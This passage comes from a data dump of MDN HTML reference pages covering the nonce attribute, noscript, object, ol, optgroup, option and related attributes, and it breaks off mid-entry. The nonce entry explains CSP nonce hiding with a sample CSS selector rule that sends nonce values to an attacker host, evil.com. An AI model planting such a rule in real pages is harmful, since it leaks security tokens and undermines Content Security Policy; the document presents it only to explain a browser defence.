  summary: The nonce global attribute is a content attribute defining a cryptographic nonce ("number used once") which can be used by Content Security Policy to determine whether or not a given fetch will be allowed to proceed for a given element
  description: "# nonce\n\nThe `nonce` [global attribute](../global_attributes) is a content attribute defining a cryptographic nonce (\"number used once\") which can be used by [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) to determine whether or not a given fetch will be allowed to proceed for a given element.\n\n## Description\n\nThe `nonce` attribute is useful to allowlist specific elements, such as a particular inline script or style elements. It can help you to avoid using the [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) `unsafe-inline` directive, which would allowlist *all* inline scripts or styles.\n\n**Note:** Only use `nonce` for cases where you have no way around using unsafe inline script or style contents. If you don't need `nonce`, don't use it. If your script is static, you could also use a CSP hash instead. (See usage notes on [unsafe inline script](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script).) Always try to take full advantage of [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) protections and avoid nonces or unsafe inline scripts whenever possible.\n\n### Using nonce to allowlist a \\<script\\> element\n\nThere are a few steps involved to allowlist an inline script using the nonce mechanism:\n\n#### Generating values\n\nFrom your web server, generate a random base64-encoded string of at least 128 bits of data from a cryptographically secure random number generator. Nonces should be generated differently each time the page loads (nonce only once!). For example, in nodejs:\n\njs\n\n```\nconst crypto = require(\"crypto\");\ncrypto.randomBytes(16).toString(\"base64\");\n// '8IBTHwOdqNKAWeKl7plt8g=='\n```\n\n#### Allowlisting inline script\n\nThe nonce generated on your backend code should now be used for the inline script that you'd like to allowlist:\n\nhtml\n\n```\n<script nonce=\"8IBTHwOdqNKAWeKl7plt8g==\">\n  // …\n</script>\n```\n\n#### Sending a nonce with a CSP header\n\nFinally, you'll need to send the nonce value in a [`Content-Security-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) header (prepend `nonce-`):\n\nhttp\n\n```\nContent-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='\n```\n\n### Accessing nonces and nonce hiding\n\nFor security reasons, the `nonce` content attribute is hidden (an empty string will be returned).\n\njs\n\n```\nscript.getAttribute(\"nonce\"); // returns empty string\n```\n\nThe [`nonce`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/nonce) property is the only way to access nonces:\n\njs\n\n```\nscript.nonce; // returns nonce value\n```\n\nNonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms that can grab data from content attributes like this:\n\ncss\n\n```\nscript[nonce~=\"whatever\"] {\n  background: url(\"https://evil.com/nonce?whatever\");\n}\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `nonce`        | 61      | 79   | 31      | 48    | 15.4   | 61             | 31                  | 45            | 15.4          | 8.0              | 61              |     |\n| `nonce_hiding` | 61      | 79   | 75      | 48    | No     | 61             | 79                  | 45            | No            | 8.0              | 61              |     |\n\n## See also\n\n- [`HTMLElement.nonce`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/nonce)\n- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)\n- CSP: [`script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce)"
- name: noscript
  summary: The <noscript> HTML element defines a section of HTML to be inserted if a script type on the page is unsupported or if scripting is currently turned off in the browser
  description: "# \\<noscript\\>: The Noscript element\n\nThe `<noscript>` [HTML](../index) element defines a section of HTML to be inserted if a script type on the page is unsupported or if scripting is currently turned off in the browser.\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Examples\n\nhtml\n\n```\n<noscript>\n  <!-- anchor linking to external file -->\n  <a href=\"https://www.mozilla.org/\">External Link</a>\n</noscript>\n<p>Rocks!</p>\n```\n\n### Result with scripting enabled\n\nRocks!\n\n### Result with scripting disabled\n\n[External Link](https://www.mozilla.org/)\n\nRocks!\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `noscript` | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/noscript](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/noscript)"
- name: novalidate (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`novalidate`](element/form#novalidate)

    [`<form>`](element/form)

    This attribute indicates that the form shouldn't be validated when submitted.
- name: object
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<object\\>: The External Object element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fobject&level=high)\n\nThe `<object>` [HTML](../index) element represents an external resource, which can be treated as an image, a nested browsing context, or a resource to be handled by a plugin.\n\n## Try it\n\n#### HTML Demo: \\<object\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <object type=\"application/pdf\" data=\"/media/examples/In-CC0.pdf\" width=\"250\" height=\"200\"></object>\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`archive`](#archive) Deprecated  \nA space-separated list of URIs for archives of resources for the object.\n\n[`border`](#border) Deprecated  \nThe width of a border around the control, in pixels.\n\n[`classid`](#classid) Deprecated  \nThe URI of the object's implementation. It can be used together with, or in place of, the **data** attribute.\n\n[`codebase`](#codebase) Deprecated  \nThe base path used to resolve relative URIs specified by **classid**, **data**, or **archive**. If not specified, the default is the base URI of the current document.\n\n[`codetype`](#codetype) Deprecated  \nThe content type of the data specified by **classid**.\n\n[`data`](#data)  \nThe address of the resource as a valid URL. At least one of **data** and **type** must be defined.\n\n[`declare`](#declare) Deprecated  \nThe presence of this Boolean attribute makes this element a declaration only. The object must be instantiated by a subsequent `<object>` element. Repeat the `<object>` element completely each time the resource is reused.\n\n[`form`](#form)  \nThe form element, if any, that the object element is associated with (its *form owner*). The value of the attribute must be an ID of a [`<form>`](form) element in the same document.\n\n[`height`](#height)  \nThe height of the displayed resource, in [CSS pixels](https://drafts.csswg.org/css-values/#px). — (Absolute values only. [NO percentages](https://html.spec.whatwg.org/multipage/embedded-content.html#dimension-attributes))\n\n[`name`](#name)  \nThe name of valid browsing context (HTML5), or the name of the control (HTML 4).\n\n[`standby`](#standby) Deprecated  \nA message that the browser can show while loading the object's implementation and data.\n\n[`type`](#type)  \nThe [content type](https://developer.mozilla.org/en-US/docs/Glossary/MIME_type) of the resource specified by **data**. At least one of **data** and **type** must be defined.\n\n[`usemap`](#usemap) Deprecated  \nA hash-name reference to a [`<map>`](map) element; that is a '#' followed by the value of a [`name`](map#name) of a map element.\n\n[`width`](#width)  \nThe width of the display resource, in [CSS pixels](https://drafts.csswg.org/css-values/#px). — (Absolute values only. [NO percentages](https://html.spec.whatwg.org/multipage/embedded-content.html#dimension-attributes))\n\n## Examples\n\n### Embed a video\n\n#### HTML\n\nhtml\n\n```\n<object\n  type=\"video/mp4\"\n  data=\"https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.webm\"\n  width=\"600\"\n  height=\"140\">\n  <img src=\"path/image.jpg\" alt=\"useful image description\" />\n</object>\n```\n\n#### Result\n\nIf the video in the example fails to load, the user will be provided with an image as fallback content. The [`<img>`](img) tag is used to display an image. We include the `src` attribute set to the path to the image we want to embed. We also include the `alt` attribute, which provides the image with an accessible name. If the image also fails to load, the content of the `alt` attribute will be displayed.\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |\n|---------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content); [phrasing content](../content_categories#phrasing_content); [embedded content](../content_categories#embedded_content), palpable content; if the element has a [`usemap`](#usemap) attribute, [interactive content](../content_categories#interactive_content); [listed](../content_categories#form_listed), [submittable](../content_categories#form_submittable) [form-associated](../content_categories#form-associated_content) element. |\n| Permitted content                           | zero or more [`<param>`](param) elements, then [transparent](../content_categories#transparent_content_model).                                                                                                                                                                                                                                                                                                                                                                                   |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| Permitted parents                           | Any element that accepts [embedded content](../content_categories#embedded_content).                                                                                                                                                                                                                                                                                                                                                                                                             |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                                                                                                                                                                                                                                                              |\n| Permitted ARIA roles                        | [`application`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/application_role), [`document`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/document_role), [`img`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/img_role)                                                                                                                                                                                              |\n| DOM interface                               | [`HTMLObjectElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLObjectElement)                                                                                                                                                                                                                                                                                                                                                                                                        |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `object`   | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `archive`  | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `border`   | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `classid`  | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `codebase` | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `codetype` | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `data`     | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `declare`  | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `form`     | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `height`   | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `name`     | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `standby`  | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `tabindex` | 1       | 12   | 1       | 15    | 3.1    | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `type`     | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `usemap`   | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `width`    | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<embed>`](embed)\n- [`<param>`](param)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object)"
- name: ol
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<ol\\>: The Ordered List element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fol&level=high)\n\nThe `<ol>` [HTML](../index) element represents an ordered list of items — typically rendered as a numbered list.\n\n## Try it\n\n#### HTML Demo: \\<ol\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <ol>\n      <li>Mix flour, baking powder, sugar, and salt.</li>\n      <li>In another bowl, mix eggs, milk, and oil.</li>\n      <li>Stir both mixtures together.</li>\n      <li>Fill muffin tray 3/4 full.</li>\n      <li>Bake for 20 minutes.</li>\n    </ol>\n\n    li {\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n      margin-bottom: 0.5rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element also accepts the [global attributes](../global_attributes).\n\n[`reversed`](#reversed)  \nThis Boolean attribute specifies that the list's items are in reverse order. Items will be numbered from high to low.\n\n[`start`](#start)  \nAn integer to start counting from for the list items. Always an Arabic numeral (1, 2, 3, etc.), even when the numbering `type` is letters or Roman numerals. For example, to start numbering elements from the letter \"d\" or the Roman numeral \"iv,\" use `start=\"4\"`.\n\n[`type`](#type)  \nSets the numbering type:\n\n- `a` for lowercase letters\n- `A` for uppercase letters\n- `i` for lowercase Roman numerals\n- `I` for uppercase Roman numerals\n- `1` for numbers (default)\n\nThe specified type is used for the entire list unless a different [`type`](li#type) attribute is used on an enclosed [`<li>`](li) element.\n\n**Note:** Unless the type of the list number matters (like legal or technical documents where items are referenced by their number/letter), use the CSS [`list-style-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/list-style-type) property instead.\n\n## Usage notes\n\nTypically, ordered list items display with a preceding [marker](https://developer.mozilla.org/en-US/docs/Web/CSS/::marker), such as a number or letter.\n\nThe `<ol>` and [`<ul>`](ul) (or the synonym [`<menu>`](menu)) elements may nest as deeply as desired, alternating between `<ol>`, `<ul>` (or `<menu>`) as needed.\n\nThe `<ol>` and [`<ul>`](ul) elements both represent a list of items. The difference is with the `<ol>` element, the order is meaningful. For example:\n\n- Steps in a recipe\n- Turn-by-turn directions\n- The list of ingredients in decreasing proportion on nutrition information labels\n\nTo determine which list to use, try changing the order of the list items; if the meaning changes, use the `<ol>` element — otherwise you can use [`<ul>`](ul) otherwise, or [`<menu>`](menu) if your list is a menu.\n\n## Examples\n\n### Simple example\n\nhtml\n\n```\n<ol>\n  <li>Fee</li>\n  <li>Fi</li>\n  <li>Fo</li>\n  <li>Fum</li>\n</ol>\n```\n\n#### Result\n\n### Using Roman Numeral type\n\nhtml\n\n```\n<ol type=\"i\">\n  <li>Introduction</li>\n  <li>List of Grievances</li>\n  <li>Conclusion</li>\n</ol>\n```\n\n#### Result\n\n### Using the start attribute\n\nhtml\n\n```\n<p>Finishing places of contestants not in the winners' circle:</p>\n\n<ol start=\"4\">\n  <li>Speedwalk Stu</li>\n  <li>Saunterin' Sam</li>\n  <li>Slowpoke Rodriguez</li>\n</ol>\n```\n\n#### Result\n\n### Nesting lists\n\nhtml\n\n```\n<ol>\n  <li>first item</li>\n  <li>\n    second item\n    <!-- closing </li> tag is not here! -->\n    <ol>\n      <li>second item first subitem</li>\n      <li>second item second subitem</li>\n      <li>second item third subitem</li>\n    </ol>\n  </li>\n  <!-- Here's the closing </li> tag -->\n  <li>third item</li>\n</ol>\n```\n\n#### Result\n\n### Unordered list inside ordered list\n\nhtml\n\n```\n<ol>\n  <li>first item</li>\n  <li>\n    second item\n    <!-- closing </li> tag is not here! -->\n    <ul>\n      <li>second item first subitem</li>\n      <li>second item second subitem</li>\n      <li>second item third subitem</li>\n    </ul>\n  </li>\n  <!-- Here's the closing </li> tag -->\n  <li>third item</li>\n</ol>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |\n|---------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), and if the `<ol>` element's children include at least one [`<li>`](li) element, [palpable content](../content_categories#palpable_content|\n| Permitted content                           | Zero or more [`<li>`](li), [`<script>`](script) and [`<template>`](template) elements|\n| Tag omission                                | None, both the starting and ending tag are mandatory|\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content|\n| Implicit ARIA role                          | [`list`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/list_role|\n| Permitted ARIA roles                        | [`directory`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/directory_role), [`group`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/group_role), [`listbox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/listbox_role), [`menu`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/menu_role), [`menubar`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/menubar_role), [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role), [`radiogroup`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/radiogroup_role), [`tablist`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/tablist_role), [`toolbar`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/toolbar_role), [`tree`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/tree_role) |\n| DOM interface                               | [`HTMLOListElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLOListElement|\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `ol`       | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `compact`  | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `reversed` | 18      | ≤79  | 18      | 15    | 6      | 18             | 18                  | 14            | 6             | 1.0              | 4.4             |     |\n| `start`    | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `type`     | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- Other list-related HTML Elements: [`<ul>`](ul), [`<li>`](li), [`<menu>`](menu)\n- CSS properties that may be specially useful to style the `<ol>` element:\n  - the [`list-style`](https://developer.mozilla.org/en-US/docs/Web/CSS/list-style) property, to choose the way the ordinal displays\n  - [CSS counters](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_counter_styles/Using_CSS_counters), to handle complex nested lists\n  - the [`line-height`](https://developer.mozilla.org/en-US/docs/Web/CSS/line-height) property, to simulate the deprecated `compact` attribute\n  - the [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin) property, to control the list indentation\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/ol](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/ol)"
- name: open (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`open`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/open)

    [`<details>`](element/details), [`<dialog>`](element/dialog)

    Indicates whether the contents are currently visible (in the case of a `<details>` element) or whether the dialog is active and can be interacted with (in the case of a `<dialog>` element).
- name: optgroup
  summary: The <optgroup> HTML element creates a grouping of options within a <select> element
  description: "# \\<optgroup\\>: The Option Group element\n\nThe `<optgroup>` [HTML](../index) element creates a grouping of options within a [`<select>`](select) element.\n\n## Try it\n\n#### HTML Demo: \\<optgroup\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"dino-select\">Choose a dinosaur:</label>\n    <select id=\"dino-select\">\n      <optgroup label=\"Theropods\">\n        <option>Tyrannosaurus</option>\n        <option>Velociraptor</option>\n        <option>Deinonychus</option>\n      </optgroup>\n      <optgroup label=\"Sauropods\">\n        <option>Diplodocus</option>\n        <option>Saltasaurus</option>\n        <option>Apatosaurus</option>\n      </optgroup>\n    </select>\n\n    label {\n      display: block;\n      margin-bottom: 10px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n**Note:** Optgroup elements may not be nested.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`disabled`](../attributes/disabled)  \nIf this Boolean attribute is set, none of the items in this option group is selectable. Often browsers grey out such control and it won't receive any browsing events, like mouse clicks or focus-related ones.\n\n[`label`](#label)  \nThe name of the group of options, which the browser can use when labeling the options in the user interface. This attribute is mandatory if this element is used.\n\n## Examples\n\nhtml\n\n```\n<select>\n  <optgroup label=\"Group 1\">\n    <option>Option 1.1</option>\n  </optgroup>\n  <optgroup label=\"Group 2\">\n    <option>Option 2.1</option>\n    <option>Option 2.2</option>\n  </optgroup>\n  <optgroup label=\"Group 3\" disabled>\n    <option>Option 3.1</option>\n    <option>Option 3.2</option>\n    <option>Option 3.3</option>\n  </optgroup>\n</select>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                            |\n|---------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None.                                                                                                                                                                      |\n| Permitted content                           | Zero or more [`<option>`](option) elements.                                                                                                                                |\n| Tag omission                                | The start tag is mandatory. The end tag is optional if this element is immediately followed by another `<optgroup>` element, or if the parent element has no more content. |\n| Permitted parents                           | A [`<select>`](select) element.                                                                                                                                            |\n| Implicit ARIA role                          | [`group`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/group_role)                                                                                |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                                                        |\n| DOM interface                               | [`HTMLOptGroupElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLOptGroupElement)                                                                              |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `optgroup` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `disabled` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `label`    | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- Other form-related elements: [`<form>`](form), [`<legend>`](legend), [`<label>`](label), [`<button>`](button), [`<select>`](select), [`<datalist>`](datalist), [`<option>`](option), [`<fieldset>`](fieldset), [`<textarea>`](textarea), [`<input>`](input), [`<output>`](output), [`<progress>`](progress) and [`<meter>`](meter).\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/optgroup](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/optgroup)"
- name: optimum (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`optimum`](element/meter#optimum)

    [`<meter>`](element/meter)

    Indicates the optimal numeric value.
- name: option
  summary: The <option> HTML element is used to define an item contained in a <select>, an <optgroup>, or a <datalist> element
  description: "# \\<option\\>: The HTML Option element\n\nThe `<option>` [HTML](../index) element is used to define an item contained in a [`<select>`](select), an [`<optgroup>`](optgroup), or a [`<datalist>`](datalist) element. As such, `<option>` can represent menu items in popups and other lists of items in an HTML document.\n\n## Try it\n\n#### HTML Demo: \\<option\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"pet-select\">Choose a pet:</label>\n\n    <select id=\"pet-select\">\n      <option value=\"\">--Please choose an option--</option>\n      <option value=\"dog\">Dog</option>\n      <option value=\"cat\">Cat</option>\n      <option value=\"hamster\">Hamster</option>\n      <option value=\"parrot\">Parrot</option>\n      <option value=\"spider\">Spider</option>\n      <option value=\"goldfish\">Goldfish</option>\n    </select>\n\n    label {\n      font-family: sans-serif;\n      font-size: 1rem;\n      padding-right: 10px;\n    }\n\n    select {\n      font-size: 0.9rem;\n      padding: 2px 5px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`disabled`](../attributes/disabled)  \nIf this Boolean attribute is set, this option is not checkable. Often browsers grey out such control and it won't receive any browsing event, like mouse clicks or focus-related ones. If this attribute is not set, the element can still be disabled if one of its ancestors is a disabled [`<optgroup>`](optgroup) element.\n\n[`label`](#label)  \nThis attribute is text for the label indicating the meaning of the option. If the `label` attribute isn't defined, its value is that of the element text content.\n\n[`selected`](#selected)  \nIf present, this Boolean attribute indicates that the option is initially selected. If the `<option>` element is the descendant of a [`<select>`](select) element whose [`multiple`](select#multiple) attribute is not set, only one single `<option>` of this [`<select>`](select) element may have the `selected` attribute.\n\n[`value`](#value)  \nThe content of this attribute represents the value to be submitted with the form, should this option be selected. If this attribute is omitted, the value is taken from the text content of the option element.\n\n## Styling with CSS\n\nStyling the `<option>` element is highly limited. Options don't inherit the font set on the parent. In Firefox, only [`color`](https://developer.mozilla.org/en-US/docs/Web/CSS/color) and [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) can be set, however in Chrome and Safari it's not possible to set any properties. You can find more details about styling in [our guide to advanced form styling](https://developer.mozilla.org/en-US/docs/Learn/Forms/Advanced_form_styling).\n\n## Examples\n\nSee [`<select>`](select) for examples.\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                         |\n|---------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None.                                                                                                                                                                                                   |\n| Permitted content                           | Text, possibly with escaped characters (like `&eacute;`).                                                                                                                                               |\n| Tag omission                                | The start tag is mandatory. The end tag is optional if this element is immediately followed by another `<option>` element or an [`<optgroup>`](optgroup), or if the parent element has no more content. |\n| Permitted parents                           | A [`<select>`](select), an [`<optgroup>`](optgroup) or a [`<datalist>`](datalist) element.                                                                                                              |\n| Implicit ARIA role                          | [`option`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/option_role)                                                                                                           |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                                                                                     |\n| DOM interface                               | [`HTMLOptionElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLOptionElement)                                                                                                               |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- Other form-related elements: [`<form>`](form), [`<legend>`](legend), [`<label>`](label), [`<button>`](button), [`<select>`](select), [`<datalist>`](datalist), [`<optgroup>`](optgroup), [`<fieldset>`](fieldset), [`<textarea>`](textarea), [`<input>`](input), [`<output>`](output), [`<progress>`](progress) and 